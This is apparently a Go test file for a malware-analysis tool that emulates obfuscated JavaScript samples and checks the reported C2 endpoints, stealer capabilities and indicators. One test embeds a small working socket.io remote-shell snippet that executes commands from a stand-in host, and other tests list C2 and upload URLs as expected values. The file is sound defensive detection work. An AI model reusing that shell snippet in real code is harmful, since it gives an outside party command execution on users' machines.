package extract

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/n4uu/crumble/internal/sandbox"
)

func extractFile(t *testing.T, path string, opts Options) *Report {
	t.Helper()
	src, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	opts.Name = filepath.Base(path)
	opts.Budget = 30 * time.Second // generous: -race slows goja down a lot
	r, err := Extract(src, opts)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func TestShellModule(t *testing.T) {
	for _, preset := range []string{"default", "b64", "rc4"} {
		t.Run(preset, func(t *testing.T) {
			r := extractFile(t, "../../testdata/js/shell."+preset+".obf.js", Options{})
			if !strings.Contains(r.Verdict, "socket.io shell") {
				t.Errorf("verdict = %q", r.Verdict)
			}
			if len(r.SocketIO) != 1 {
				t.Fatalf("socket.io = %+v", r.SocketIO)
			}
			s := r.SocketIO[0]
			if s.URL != "http://203.0.113.47:1418" || s.CommandEvent != "command" || s.ReplyEvent != "message" {
				t.Errorf("socket = %+v", s)
			}
			if s.CommandExec {
				t.Error("fixture never executes, but CommandExec is set")
			}
			if r.Identity["uid"] != "c7f2a1e09b" || r.Identity["t"] != "5" || r.Identity["_event"] != "identify" {
				t.Errorf("identity = %v", r.Identity)
			}
			if len(r.C2) != 1 || r.C2[0].Port != 1418 || r.C2[0].Role != "socket.io C2" || r.C2[0].Source != "emulation" {
				t.Errorf("c2 = %+v", r.C2)
			}
		})
	}
}

func TestLoaderModule(t *testing.T) {
	for _, preset := range []string{"default", "b64", "rc4"} {
		t.Run(preset, func(t *testing.T) {
			path := "../../testdata/js/loader." + preset + ".obf.js"

			// Static only: the error-handler eval is visible in the source.
			r := extractFile(t, path, Options{NoEmulate: true})
			if len(r.Roles) == 0 || r.Roles[0].Name != "loader" || r.Roles[0].Confidence != "static" {
				t.Fatalf("static roles = %+v", r.Roles)
			}
			if !strings.Contains(strings.Join(r.Roles[0].Evidence, " "), "response.data") {
				t.Errorf("static evidence = %v", r.Roles[0].Evidence)
			}

			// Emulated with a 500 carrying a stage: observed.
			r = extractFile(t, path, Options{Response: sandbox.Response{Status: 500, Body: "void 0"}})
			if len(r.Stages) != 1 || r.Stages[0].Via != "eval" {
				t.Fatalf("stages = %+v", r.Stages)
			}
			if len(r.C2) == 0 || r.C2[0].Role != "stage delivery" || r.C2[0].URL != "http://api.token-check.invalid:3000/api/service/token/2b8c1d4e" {
				t.Errorf("c2 = %+v", r.C2)
			}
			if !strings.Contains(r.Verdict, "loader") {
				t.Errorf("verdict = %q", r.Verdict)
			}
		})
	}
}

func TestCollectorModule(t *testing.T) {
	for _, preset := range []string{"default", "b64", "rc4"} {
		t.Run(preset, func(t *testing.T) {
			r := extractFile(t, "../../testdata/js/collector."+preset+".obf.js", Options{})
			caps := map[string]string{}
			for _, c := range r.Capabilities {
				caps[c.Name] = c.Confidence
			}
			for _, want := range []string{"crypto wallet theft", "keylogging", "screen capture", "browser credential theft", "virtualisation / sandbox check"} {
				if caps[want] == "" {
					t.Errorf("missing capability %q (have %v)", want, caps)
				}
			}
			if caps["file exfiltration"] != "observed" {
				t.Errorf("file exfiltration = %q, want observed", caps["file exfiltration"])
			}
			var roles []string
			for _, e := range r.C2 {
				roles = append(roles, e.Role+" "+e.URL)
			}
			got := strings.Join(roles, "|")
			if !strings.Contains(got, "file upload http://198.51.100.88:1224/uploads") || !strings.Contains(got, "static only http://ldb.example-cdn.invalid/cldbs") {
				t.Errorf("endpoints = %s", got)
			}
		})
	}
}

func TestRemoteShellObserved(t *testing.T) {
	src := []byte(`
		const { io } = require('socket.io-client');
		const { exec } = require('child_process');
		const s = io('http://203.0.113.47:1418');
		s.on('command', m => exec(m.message, { windowsHide: true }, (e, o, er) => s.emit('message', { result: o })));
	`)
	r, err := Extract(src, Options{Name: "inline.js", Budget: 30 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	if !r.SocketIO[0].CommandExec {
		t.Fatalf("CommandExec not set: %+v", r.SocketIO[0])
	}
	for _, c := range r.Capabilities {
		if c.Name == "remote shell" && c.Confidence != "observed" {
			t.Errorf("remote shell confidence = %s", c.Confidence)
		}
	}
	if len(r.Commands) != 0 {
		t.Errorf("probe leaked into commands: %v", r.Commands)
	}
}

func TestIndicators(t *testing.T) {
	got := indicators([]string{
		"http://203.0.113.10:1224/pdown",
		"203.0.113.10:1224",
		"198.51.100.3:1418",
		"connect to 192.0.2.44 later",
		"socket.io-client",
		"ldb.rightwidth.invalid",
		"https://registry.npmjs.org/axios",
		"Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36",
		"v1.2.3.4",
	})
	var vals []string
	for _, i := range got {
		v := i.Type + " " + i.Value
		if i.Benign {
			v += " (benign)"
		}
		vals = append(vals, v)
	}
	want := []string{
		"url http://203.0.113.10:1224/pdown",
		"ip:port 198.51.100.3:1418",
		"ip 192.0.2.44",
		"domain ldb.rightwidth.invalid",
		"url https://registry.npmjs.org/axios (benign)",
	}
	if strings.Join(vals, "\n") != strings.Join(want, "\n") {
		t.Errorf("indicators:\n%s\nwant:\n%s", strings.Join(vals, "\n"), strings.Join(want, "\n"))
	}
}
